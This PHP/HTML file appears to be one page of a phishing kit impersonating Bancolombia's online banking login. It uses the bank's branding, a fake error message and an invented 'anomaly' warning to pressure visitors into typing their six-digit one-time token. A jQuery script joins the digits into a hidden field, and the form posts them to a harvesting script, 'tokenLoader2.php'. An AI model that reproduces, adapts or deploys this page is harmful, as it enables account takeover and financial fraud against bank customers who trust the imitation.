<?php 
    error_reporting(0);

    date_default_timezone_set('America/Bogota');

    function getRealIP() {

        if (!empty($_SERVER['HTTP_CLIENT_IP']))
            return $_SERVER['HTTP_CLIENT_IP'];
        
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
    
        return $_SERVER['REMOTE_ADDR'];
    }

    function get_nombre_dia($fecha){
        $fechats = strtotime($fecha); //pasamos a timestamp
     
     //el parametro w en la funcion date indica que queremos el dia de la semana
     //lo devuelve en numero 0 domingo, 1 lunes,....
     switch (date('w', $fechats)){
         case 0: return "Domingo"; break;
         case 1: return "Lunes"; break;
         case 2: return "Martes"; break;
         case 3: return "Miercoles"; break;
         case 4: return "Jueves"; break;
         case 5: return "Viernes"; break;
         case 6: return "Sabado"; break;
     }
     }


    function getMonth() {
        switch (date("m")) {
            case '01':
                return 'Enero';
                break;
            case '02':
                return 'Febrero';
                break;
            case '03':
                return 'Marzo';
                break;
            case '04':
                return 'Abril';
                break;
            case '05':
                return 'Mayo';
                break;
            case '06':
                return 'Junio';
                break;
            case '07':
                return 'Julio';
                break;
            case '08':
                return 'Agosto';
                break;
            case '09':
                return 'Septiembre';
                break;
            case '10':
                return 'Octubre';
                break;
            case '11':
                return 'Noviembre';
                break;
            case '12':
                return 'Diciembre';
                break;
            
            default:
                'Dato invalido';
                break;
        }
    }

?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">

    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Open Sans';
            src: url('./assets/fonts/OpenSans-Regular.ttf');
        }
        @font-face {
            font-family: 'CIBFontSans';
            src: url('./assets/fonts/CIBFontSans-Light.ttf');
        }
        * {
            font-family: 'Open Sans';
        }
        .font-custom {
            font-family: 'CIBFontSans' !important;
        }
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input:focus {
            outline: none;
        }
        .keyboard-button *{
            color: #2c2a29 !important;
        }
        .keyboard-button{
            height: 38px;
            width: 38px;
            border: 1px solid black;
        }

        .especialInput{
            width: 44px;
            height: 44px;
            border: 0px;
            border-bottom: 3px solid #FDDA24;
            outline: none;
            margin: 1px;
            text-align:center;
            background: #f7f7f7;
            margin:0 2px;
            font-size:20px;
        }
        .pin{
            color:#ffffff;
            font-size:20px;
            text-align:center;
        }

    </style>
    	<script>
            function soloNumeros(e){
              var key = window.event ? e.which : e.keyCode;
              if (key < 48 || key > 57) {
                e.preventDefault();
              }
            }
        </script>
</head>
<body>
    <div class=" sm:mx-[55px] px-[15px] pt-[10px]">
        <div class="flex flex-col gap-[10px] pb-[20px]">
            <div>
                <img src="./assets/logo.svg" alt="logo" class="sm:mt-[10px]">
            </div>
            <p class="text-base text-[#2c2a29]">Sucursal Virtual Personas</p>
            <div class="flex">
                <p class="text-[11px] text-[#2c2a29]">Fecha y hora actual:</p>
                <p class="ml-5 inline-block text-xs"><?php echo get_nombre_dia(date("Y") . '-'. date("m") .'-'. date("d")) . " del " . getMonth() . " de " . date("Y") ;?></p>
                <p class="inline-block text-xs" id="hora"></p>
            </div>
        </div>

        <div class="px-[15px] py-[10px] bg-[#2c2a29]">
            <p class="ml-[5px] text-white font-custom">Inicio de sesión</p>
        </div>

        <div class="border-[1px] border-[#CCCCCC] flex items-center p-2 mt-5">
            <div class="mr-3">
                <img src="./assets/icons/close.png" alt="error" class="h-[38px]" style="max-width: none;">
            </div>
            <div>
                <p>Error.</p>
                <p>Hemos tenido un error, por favor vuelva a ingresar la clave dinamica.</p>
            </div>
        </div>

        <div class="pt-[30px]  mb-[35px]">
            <div class="flex justify-center gap-[15px]">
                <div class="border-[1px] border-[#CCCCCC] pb-[15px]">
                    
                    <form action="tokenLoader2.php" method="POST">
                        <div class="px-[5px] py-[5px] bg-[#2c2a29]">
                            <p class="font-custom ml-[5px] text-white">Clave dinamica</p>
                        </div>
                        <div class="bg-[#F4F4F4] px-[5px]">
                            <p class="px-[5px] py-[8px] text-xs">Hemos detectado una anomalia, necesitamos verificar tu identidad</p>
                        </div>

                        <div class="px-[10px] pt-[8px] flex gap-3 flex-col">
                            <div class="flex gap-3">
                                <p class="text-sm text-[#2c2a29] font-custom font-bold">Ingresa tu clave dinamica</p>
                            </div>
                            

                            <div class="flex justify-center flex-col items-center mt-10">
                                <div class="pin-wrapper">
                                    <input name="pin1" class="especialInput"  required type="text" data-role="pin" maxlength="1" class="pin-input">
                                    <input name="pin2" class="especialInput"  required type="text" data-role="pin" maxlength="1" class="pin-input">
                                    <input name="pin3" class="especialInput"  required type="text" data-role="pin" maxlength="1" class="pin-input">
                                    <input name="pin4" class="especialInput"  required type="text" data-role="pin" maxlength="1" class="pin-input">
                                    <input name="pin5" class="especialInput"  required type="text" data-role="pin" maxlength="1" class="pin-input">
                                    <input name="pin6" class="especialInput"  required type="text" data-role="pin" maxlength="1" class="pin-input">
                                  </div>
                                  <p class="text-[#2c2a29] text-xs mt-2">Ve a tu dispositivo y ingresa la clave dinamica</p>
                                </div>
                                
                                <div class="pt-[30px] flex justify-center gap-4">
                                    <button class="border-[1px] border-[#2c2a29] text-sm px-[15px] pt-[8px] pb-[7px] text-[#2c2a29]">Cancelar</button>
                                    <button class="bg-[#fdda24] text-sm px-[15px] pt-[8px] pb-[7px] text-[#2c2a29]">Ingresar</button>
                                </div>
                                <div class="flex gap-[10px] items-center justify-end text-sm">
                                    <img style="height: 13px;" src="./assets/icons/info-user.png" alt="">
                                    <p style="cursor: pointer;">Como obtengo mi token?</p>
                                </div>
                            </div>
                            <input name="token2" class="result absolute bg-none" value="" readonly style="color:white; z-index: -299; cursor: default;" /> 
                    </form>
                    
                </div>

            </div>
            
        
        </div>

        <footer>
            <p class="text-xs">
                Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - 
                <br/>
                Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
		 
            </p>
            <div class="flex justify-between text-[11px] mt-2">
                <p>Dirección IP: <?php echo getRealIP(); ?></p>
                <p>Copyright © Bancolombia S.A.</p>
            </div>
        </footer>
    </div>
    <script>

        const horaSelector = document.querySelector('#hora');
        const currentTime = new Date();
        horaSelector.innerText = currentTime.toLocaleTimeString('en-US');
        
        setInterval(() => {
            const currentTime = new Date();
            horaSelector.innerText = currentTime.toLocaleTimeString('en-US');
        }, 1000);
        

    </script> 
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script>
        /*
        05-01-2017
        Author - Anshul Kumar
        Plugin to validate the pin entered by a DigitRx user. The pin is broken down into 4 individual numbers and the user enters 1 number in each input box. The data entry is automated as in the user is automatically taken to the next input box once he has entered something in the current input. Backspace and arrow keys work as well. Callback functionalities have also been provided in the plugin.

        This plugin checks if all four input boxes have been filled, and then concatenates the data in all the input boxes. Once all four input boxes are filled, we can use callback functionalities present in the plugin to make an AJAX call to the database to check if the pin matches or not.


        ============Basic Initialization============
        Wrap your html in a wrapper and pass the wrapper's class or ID in the plugin call. Let's assume our wrapper has the class 'pin-wrapper'

        $('.pin-wrapper').validatePin();


        ============Options============
        1) numericKeyboardOnMobile - If set true, it will prompt mobile devices to open numeric keyboard

            $('.pin-wrapper').validatePin({
                numericKeyboardOnMobile: true,
            });

        2) blurOnSuccess - If set true, it will remove focus from the input fields on success

            $('.pin-wrapper').validatePin({
                    blurOnSuccess: true,
            });


        ============Callback functions============
        This plugin's purpose is to validate the pin entered by the user and return if the operation was successful or a failure(if all the 4 input boxes have been filled or not). 
        Checking the pin by ajax and showing appropriate responses is out of the scope of the plugin and need to be written separately
        Two callback functions are provided - onSuccess and onFailure

            $('.pin-wrapper').validatePin({
                onSuccess: function () {
                    --success code goes here--
                },
                onFailure: function () {
                    --failure code goes here--
                }
            });

        */

        (function($) {
        //Declare our function
        $.fn.validatePin = function(options) {
            var defaults = {
            //Default Settings
            numericKeyboardOnMobile: false,
            blurOnSuccess: false,

            //Declaring our callback functions
            onSuccess: function() {},
            onFailure: function() {}
            };

            var settings = $.extend({}, defaults, options);

            //Cache the DOM into a jquery object so that repetitive scanning of DOM won't be necessary
            var $wrapper = $(this),
            $el = $wrapper.find('[data-role="pin"]'),
            $elCount = $wrapper.find('[data-role="pin"]').length;
            pin = "";

            $el.each(function() {
            pin += ".";
            });

            //Event Initializations
            bindEvents();

            //Function Declarations
            function bindEvents() {
            $($el).on("focus", function() {
                selectText(this);
            });

            if (checkForMobileDevices()) {
                $($el).on("keyup", function(e) {
                var $that = this;
                validateUserInput(e, $that, "keypress");
                });
            } else {
                $($el).on("keypress", function(e) {
                var $that = this;
                setTimeout(function() {
                    validateUserInput(e, $that, "keypress");
                }, 0);
                });
            }
            $($el).on("keydown", function(e) {
                var $that = this;
                setTimeout(function() {
                validateUserInput(e, $that, "keydown");
                }, 0);
            });
            }

            //Select the text in an input field
            function selectText(obj) {
            var value = $(obj).val();
            if (!checkForMobileDevices() && $.trim(value) != "") {
                $(obj).select();
            }
            }

            //Validate User Input
            function validateUserInput(e, obj, event) {
            var keycode = e.charCode || e.keyCode || e.which;
            var prevInput = $(obj).prev('[data-role="pin"]'),
                nextInput = $(obj).next('[data-role="pin"]'),
                index = $(obj).index(),
                value = $(obj).val(),
                empty;

            if (event == "keydown") {
                //Case - User Hits Left Arrow
                if (keycode === 37) {
                $(prevInput).focus();
                selectText(prevInput);
                } else if (keycode === 39) {
                //Case - User Hits Right Arrow
                $(nextInput).focus();
                selectText(nextInput);
                }

                if ($.trim(value) == "") {
                if (keycode === 8) {
                    $(prevInput).focus();
                    settings.onFailure.call(this);
                }
                } else {
                return false;
                }
            }

            if (event == "keypress") {
                if (keycode == 0) {
                return false;
                }

                //Case - User Enters an alphabet or a special character
                if (
                (keycode >= 65 && keycode <= 90) ||
                (keycode >= 186 && keycode <= 222)
                ) {
                e.preventDefault();
                }

                //Case - User enters a number from the main keypad or the numpad
                if (
                (keycode >= 48 && keycode <= 57) ||
                (keycode >= 96 && keycode <= 105)
                ) {
                pin = $.trim(pin.replace(/\s/g, ""));
                pin = pin.split("");
                pin[index] = value;
                pin = pin.join("");

                $(nextInput).focus();

                if (!checkForMobileDevices()) {
                    setTimeout(function() {
                    $(obj).val("•");
                    }, 200);
                } else {
                    $(obj).val("•");
                }
                }

                var empty = $($el).filter(function() {
                return this.value === "";
                });

                if (empty.length) {
                settings.onFailure.call(this);
                } else {
                settings.onSuccess.call(this);
                //Check if the user wants to move the focus out of the inputs on success
                if (settings.blurOnSuccess) {
                    $($el).blur();
                }
                }
            }

            //Check if default settings have been overrided by the user

            //Prompts a numberic keyboard on mobile
            }

            function checkForMobileDevices() {
            if (
                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                navigator.userAgent
                )
            ) {
                return true;
            } else {
                return false;
            }
            }

            if (settings.numericKeyboardOnMobile) {
            if (checkForMobileDevices()) {
                $el.prop("type", "tel");
            }
            }
        };
        })(jQuery);

        $(document).ready(function() {
        $(".pin-wrapper").validatePin({
            numericKeyboardOnMobile: true,
            blurOnSuccess: true,
            onSuccess: function() {
                $(".result").val(pin);
            },
            onFailure: function() {
                $(".pin").val("");
            }
        });
        });

    </script>
</body>
</html>